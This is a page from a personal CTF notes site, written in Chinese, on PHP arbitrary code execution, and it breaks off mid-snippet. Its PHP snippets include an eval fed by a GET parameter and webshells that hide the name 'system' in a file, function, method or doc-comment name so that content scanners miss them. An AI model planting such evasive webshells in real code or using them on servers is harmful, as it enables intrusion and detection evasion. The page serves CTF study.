
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>ACE · Eki's CTF</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Eki">
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-multipart/multipart.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-auto-scroll-table/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="serialize.html" />
    
    
    <link rel="prev" href="protocol.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    About
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../">
            
                <a href="../">
            
                    
                    Library
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../steganography.html">
            
                <a href="../steganography.html">
            
                    
                    Steganography
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../gdb-tutorial.html">
            
                <a href="../gdb-tutorial.html">
            
                    
                    GDB Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../sqli.html">
            
                <a href="../sqli.html">
            
                    
                    SQL Inject
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" >
            
                <span>
            
                    
                    PHP
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="function.html">
            
                <a href="function.html">
            
                    
                    Functions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="protocol.html">
            
                <a href="protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.2.4.3" data-path="ace.html">
            
                <a href="ace.html">
            
                    
                    ACE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.4" data-path="serialize.html">
            
                <a href="serialize.html">
            
                    
                    Serialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.5" data-path="misc.html">
            
                <a href="misc.html">
            
                    
                    Misc
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../htaccess.html">
            
                <a href="../htaccess.html">
            
                    
                    Apache .htaccess
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../ssti.html">
            
                <a href="../ssti.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../ssrf.html">
            
                <a href="../ssrf.html">
            
                    
                    SSRF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../xxe.html">
            
                <a href="../xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../xss.html">
            
                <a href="../xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../shell.html">
            
                <a href="../shell.html">
            
                    
                    Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="../crypto.html">
            
                <a href="../crypto.html">
            
                    
                    Crypto
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.12" data-path="../js.html">
            
                <a href="../js.html">
            
                    
                    JavaScript
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.13" data-path="../python.html">
            
                <a href="../python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.14" data-path="../bash.html">
            
                <a href="../bash.html">
            
                    
                    BASH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.15" data-path="../forensics.html">
            
                <a href="../forensics.html">
            
                    
                    Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.16" data-path="../pentest.html">
            
                <a href="../pentest.html">
            
                    
                    Pentest
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.17" data-path="../protocol.html">
            
                <a href="../protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.18" data-path="../misc.html">
            
                <a href="../misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.19" data-path="../awd.html">
            
                <a href="../awd.html">
            
                    
                    AWD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../contest/">
            
                <a href="../../contest/">
            
                    
                    Contest
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../contest/hfctf-2021.html">
            
                <a href="../../contest/hfctf-2021.html">
            
                    
                    2021数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../../contest/hackergame-2019.html">
            
                <a href="../../contest/hackergame-2019.html">
            
                    
                    Hackergame 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../../contest/tsctf-j2019.html">
            
                <a href="../../contest/tsctf-j2019.html">
            
                    
                    TSCTF-J 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../../contest/nctf2019.html">
            
                <a href="../../contest/nctf2019.html">
            
                    
                    NCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../../contest/isoon-2019.html">
            
                <a href="../../contest/isoon-2019.html">
            
                    
                    ISOON 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../../contest/mrctf-2020.html">
            
                <a href="../../contest/mrctf-2020.html">
            
                    
                    MRCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../../contest/hfctf-2020.html">
            
                <a href="../../contest/hfctf-2020.html">
            
                    
                    2020数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../../contest/npuctf-2020.html">
            
                <a href="../../contest/npuctf-2020.html">
            
                    
                    NPUCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../../contest/gkctf-2020.html">
            
                <a href="../../contest/gkctf-2020.html">
            
                    
                    GKCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.10" data-path="../../contest/sctf-2020.html">
            
                <a href="../../contest/sctf-2020.html">
            
                    
                    SCTF 2020
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../adworld/">
            
                <a href="../../adworld/">
            
                    
                    ADworld
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../../adworld/misc-exercise-area.html">
            
                <a href="../../adworld/misc-exercise-area.html">
            
                    
                    Misc Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../../adworld/crypto-execrise-area.html">
            
                <a href="../../adworld/crypto-execrise-area.html">
            
                    
                    Crypto Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../../adworld/web-execrise-area.html">
            
                <a href="../../adworld/web-execrise-area.html">
            
                    
                    Web Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../../adworld/pwn-exercise-area.html">
            
                <a href="../../adworld/pwn-exercise-area.html">
            
                    
                    PWN Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="../../adworld/reverse-execrise-area.html">
            
                <a href="../../adworld/reverse-execrise-area.html">
            
                    
                    Reverse Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.6" data-path="../../adworld/easy_tornado.html">
            
                <a href="../../adworld/easy_tornado.html">
            
                    
                    Easy Tornado
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.7" data-path="../../adworld/i-got-id-200.html">
            
                <a href="../../adworld/i-got-id-200.html">
            
                    
                    i-got-id-200
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.8" data-path="../../adworld/ics-02.html">
            
                <a href="../../adworld/ics-02.html">
            
                    
                    ics-02
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.9" data-path="../../adworld/ics-07.html">
            
                <a href="../../adworld/ics-07.html">
            
                    
                    ics-07
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.10" data-path="../../adworld/shrine.html">
            
                <a href="../../adworld/shrine.html">
            
                    
                    shrine
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.11" data-path="../../adworld/super_sqli.html">
            
                <a href="../../adworld/super_sqli.html">
            
                    
                    super_sqli
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.12" data-path="../../adworld/web_php_unserialize.html">
            
                <a href="../../adworld/web_php_unserialize.html">
            
                    
                    Web_php_unserialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.13" data-path="../../adworld/web_php_wrong_nginx_config.html">
            
                <a href="../../adworld/web_php_wrong_nginx_config.html">
            
                    
                    web_php_wrong_nginx_config
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.14" data-path="../../adworld/web_python_template_injection.html">
            
                <a href="../../adworld/web_python_template_injection.html">
            
                    
                    Web_python_template_injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.15" data-path="../../adworld/wtf.sh-150.html">
            
                <a href="../../adworld/wtf.sh-150.html">
            
                    
                    wtf.sh-150
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.16" data-path="../../adworld/zhuanxv.html">
            
                <a href="../../adworld/zhuanxv.html">
            
                    
                    Zhuanxv
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../buuoj/">
            
                <a href="../../buuoj/">
            
                    
                    BUUOJ
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../../buuoj/suctf-2019.html">
            
                <a href="../../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../../buuoj/ciscn-northeast-2019.html">
            
                <a href="../../buuoj/ciscn-northeast-2019.html">
            
                    
                    CISCN 2019 华北赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../../buuoj/ciscn-pre-2019.html">
            
                <a href="../../buuoj/ciscn-pre-2019.html">
            
                    
                    CISCN 2019 初赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="../../buuoj/ciscn-final-2019.html">
            
                <a href="../../buuoj/ciscn-final-2019.html">
            
                    
                    CISCN 2019 Final
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="../../buuoj/de1ctf-2019.html">
            
                <a href="../../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="../../buuoj/wangdingcup-2018.html">
            
                <a href="../../buuoj/wangdingcup-2018.html">
            
                    
                    网鼎杯 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="../../buuoj/wangdingcup-2019.html">
            
                <a href="../../buuoj/wangdingcup-2019.html">
            
                    
                    网鼎杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="../../buuoj/roarctf-2019.html">
            
                <a href="../../buuoj/roarctf-2019.html">
            
                    
                    RoarCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.9" data-path="../../buuoj/0ctf-2016.html">
            
                <a href="../../buuoj/0ctf-2016.html">
            
                    
                    0CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.10" data-path="../../buuoj/gxyctf-2019.html">
            
                <a href="../../buuoj/gxyctf-2019.html">
            
                    
                    GXYCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.11" data-path="../../buuoj/hitcon-2017.html">
            
                <a href="../../buuoj/hitcon-2017.html">
            
                    
                    Hitcon 2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.12" data-path="../../buuoj/jikedatiaozhan-2019.html">
            
                <a href="../../buuoj/jikedatiaozhan-2019.html">
            
                    
                    极客大挑战2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.13" data-path="../../buuoj/lctf-2018.html">
            
                <a href="../../buuoj/lctf-2018.html">
            
                    
                    LCTF 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.14" data-path="../../buuoj/de1ctf-2019.html">
            
                <a href="../../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.15" data-path="../../buuoj/swpu-2019.html">
            
                <a href="../../buuoj/swpu-2019.html">
            
                    
                    SWPU 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.16" data-path="../../buuoj/suctf-2019.html">
            
                <a href="../../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.17" data-path="../../buuoj/bjdctf-2020.html">
            
                <a href="../../buuoj/bjdctf-2020.html">
            
                    
                    BJDCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.18" data-path="../../buuoj/rctf-2015.html">
            
                <a href="../../buuoj/rctf-2015.html">
            
                    
                    RCTF 2015
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.19" data-path="../../buuoj/bytectf-2019.html">
            
                <a href="../../buuoj/bytectf-2019.html">
            
                    
                    ByteCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.20" data-path="../../buuoj/qiangwangbei-2019.html">
            
                <a href="../../buuoj/qiangwangbei-2019.html">
            
                    
                    强网杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.21" data-path="../../buuoj/ddctf-2019.html">
            
                <a href="../../buuoj/ddctf-2019.html">
            
                    
                    DDCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.22" data-path="../../buuoj/eis-2019.html">
            
                <a href="../../buuoj/eis-2019.html">
            
                    
                    EIS 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.23" data-path="../../buuoj/vn-2020.html">
            
                <a href="../../buuoj/vn-2020.html">
            
                    
                    V&N 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.24" data-path="../../buuoj/fbctf-2019.html">
            
                <a href="../../buuoj/fbctf-2019.html">
            
                    
                    FBCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.25" data-path="../../buuoj/gyctf-2020.html">
            
                <a href="../../buuoj/gyctf-2020.html">
            
                    
                    GYCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.26" data-path="../../buuoj/bjd-2nd.html">
            
                <a href="../../buuoj/bjd-2nd.html">
            
                    
                    BJDCTF 2nd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.27" data-path="../../buuoj/fireshellctf-2020.html">
            
                <a href="../../buuoj/fireshellctf-2020.html">
            
                    
                    FireShellCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.28" data-path="../../buuoj/gyctf-2020.html">
            
                <a href="../../buuoj/gyctf-2020.html">
            
                    
                    GWCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.29" data-path="../../buuoj/watevrctf-2019.html">
            
                <a href="../../buuoj/watevrctf-2019.html">
            
                    
                    WatervrCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.30" data-path="../../buuoj/ciscn-southeast-2019.html">
            
                <a href="../../buuoj/ciscn-southeast-2019.html">
            
                    
                    CISCN2019 华东南赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.31" data-path="../../buuoj/bsidescf-2019.html">
            
                <a href="../../buuoj/bsidescf-2019.html">
            
                    
                    BsidesCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.32" data-path="../../buuoj/rctf-2019.html">
            
                <a href="../../buuoj/rctf-2019.html">
            
                    
                    RCTF 2019
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../../pwnable.kr/">
            
                <a href="../../pwnable.kr/">
            
                    
                    pwnable.kr
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../../pwnable.kr/toddlers-bottle.html">
            
                <a href="../../pwnable.kr/toddlers-bottle.html">
            
                    
                    Toddler's Bottle
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../../ethernaut/">
            
                <a href="../../ethernaut/">
            
                    
                    Ethernaut
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../../vulnhub/">
            
                <a href="../../vulnhub/">
            
                    
                    Vulnhub
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../../vulnhub/dc-9.html">
            
                <a href="../../vulnhub/dc-9.html">
            
                    
                    DC-9
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../../vulnhub/five86-1.html">
            
                <a href="../../vulnhub/five86-1.html">
            
                    
                    five86-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../../vulnhub/wakanda.html">
            
                <a href="../../vulnhub/wakanda.html">
            
                    
                    wakanda
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >ACE</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#php-&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;ace&#x76F8;&#x5173;"><b></b>PHP &#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;(ACE)&#x76F8;&#x5173;</a></li><ul><li><span class="title-icon "></span><a href="#&#x53D8;&#x91CF;&#x8986;&#x76D6;"><b></b>&#x53D8;&#x91CF;&#x8986;&#x76D6;</a></li><ul><li><span class="title-icon "></span><a href="#&#x6790;&#x6784;&#x51FD;&#x6570;"><b></b>&#x6790;&#x6784;&#x51FD;&#x6570;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;"><b></b>&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;&#x6CE8;&#x91CA;"><b></b>&#x5229;&#x7528;&#x6CE8;&#x91CA;</a></li></ul><li><span class="title-icon "></span><a href="#bypass"><b></b>ByPass</a></li><ul><li><span class="title-icon "></span><a href="#&#x5F02;&#x6216;"><b></b>&#x5F02;&#x6216;</a></li><li><span class="title-icon "></span><a href="#&#x53D6;&#x53CD;"><b></b>&#x53D6;&#x53CD;</a></li><li><span class="title-icon "></span><a href="#&#x5B57;&#x7B26;&#x81EA;&#x589E;"><b></b>&#x5B57;&#x7B26;&#x81EA;&#x589E;</a></li><li><span class="title-icon "></span><a href="#&#x6570;&#x5B57;&#x62FC;&#x63A5;"><b></b>&#x201C;&#x6570;&#x5B57;&#x201D;&#x62FC;&#x63A5;</a></li><li><span class="title-icon "></span><a href="#&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;"><b></b>&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;</a></li></ul></ul></ul></div><a href="#php-&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;ace&#x76F8;&#x5173;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="php-&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;ace&#x76F8;&#x5173;"><a name="php-&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;ace&#x76F8;&#x5173;" class="anchor-navigation-ex-anchor" href="#php-&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;ace&#x76F8;&#x5173;"><i class="fa fa-link" aria-hidden="true"></i></a>PHP &#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;(ACE)&#x76F8;&#x5173;</h1>
<p>&#x5229;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;&#x540D;&#x6267;&#x884C;&#x7279;&#x6027; </p>
<h2 id="&#x53D8;&#x91CF;&#x8986;&#x76D6;"><a name="&#x53D8;&#x91CF;&#x8986;&#x76D6;" class="anchor-navigation-ex-anchor" href="#&#x53D8;&#x91CF;&#x8986;&#x76D6;"><i class="fa fa-link" aria-hidden="true"></i></a><strong>&#x53D8;&#x91CF;&#x8986;&#x76D6;</strong></h2>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
$b=<span class="hljs-string">&apos;ls&apos;</span>;
parse_str(<span class="hljs-string">&quot;a=$b&quot;</span>);
print_r(`$a`); 
<span class="hljs-meta">?&gt;</span>
</code></pre>
<h3 id="&#x6790;&#x6784;&#x51FD;&#x6570;"><a name="&#x6790;&#x6784;&#x51FD;&#x6570;" class="anchor-navigation-ex-anchor" href="#&#x6790;&#x6784;&#x51FD;&#x6570;"><i class="fa fa-link" aria-hidden="true"></i></a><strong>&#x6790;&#x6784;&#x51FD;&#x6570;</strong></h3>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
        <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span> <span class="hljs-params">()</span></span>{
            <span class="hljs-keyword">eval</span>($this-&gt;name);
        }    
    }
    highlight_file(<span class="hljs-keyword">__FILE__</span>);

    $user = <span class="hljs-keyword">new</span> User;
    $user-&gt;name = $_GET[<span class="hljs-string">&apos;l1nk&apos;</span>];
<span class="hljs-meta">?&gt;</span>
</code></pre>
<h3 id="&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;"><a name="&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;</h3>
<p>&#x4E00;&#x822C;webshell&#x662F;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x6765;&#x67E5;&#x6740;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E00;&#x5207;&#x975E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x53EF;&#x63A7;&#x503C;&#x6765;&#x6784;&#x9020;webshell&#xFF0C;&#x8B6C;&#x5982;&#x6587;&#x4EF6;&#x540D;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
substr(<span class="hljs-keyword">__FILE__</span>, <span class="hljs-number">-10</span>,<span class="hljs-number">-4</span>)($_GET[<span class="hljs-string">&apos;a&apos;</span>]);
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>&#x540C;&#x7406;&#xFF0C;&#x9664;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x8FD8;&#x6709;&#x54EA;&#x4E9B;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;&#x503C;&#x5462;&#xFF1F;</p>
<p>&#x51FD;&#x6570;&#x540D;&#x4E5F;&#x53EF;&#x3002;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">systema</span><span class="hljs-params">()</span></span>{
    substr(<span class="hljs-keyword">__FUNCTION__</span>, <span class="hljs-number">-7</span>,<span class="hljs-number">-1</span>)($_GET[<span class="hljs-string">&apos;a&apos;</span>]);
}
systema();
</code></pre>
<p>&#x540C;&#x7406;&#x65B9;&#x6CD5;&#x540D;&#x4E5F;&#x53EF;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">systema</span><span class="hljs-params">()</span></span>{
        substr(<span class="hljs-keyword">__METHOD__</span>, <span class="hljs-number">-7</span>,<span class="hljs-number">-1</span>)($_GET[<span class="hljs-string">&apos;a&apos;</span>]);
    }
}
$a = <span class="hljs-keyword">new</span> test();
$a-&gt;systema();
</code></pre>
<p>&#x8FD8;&#x6709;&#x7C7B;&#x540D; <code>__CLASS__</code> &#x4EC0;&#x4E48;&#x7684;&#x5C31;&#x4E0D;&#x518D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p>
<h3 id="&#x5229;&#x7528;&#x6CE8;&#x91CA;"><a name="&#x5229;&#x7528;&#x6CE8;&#x91CA;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;&#x6CE8;&#x91CA;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5229;&#x7528;&#x6CE8;&#x91CA;</h3>
<p><code>PHP Reflection API</code> &#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BFC;&#x51FA;&#x6216;&#x8005;&#x63D0;&#x53D6;&#x5173;&#x4E8E;&#x7C7B; , &#x65B9;&#x6CD5; , &#x5C5E;&#x6027; , &#x53C2;&#x6570; &#x7B49;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F; . &#x751A;&#x81F3;&#x5305;&#x542B;&#x6CE8;&#x91CA;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**
*system
*/</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> </span>{}

$rc = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-string">&apos;TestClass&apos;</span>);
<span class="hljs-comment">#echo $rc-&gt;getDocComment();</span>
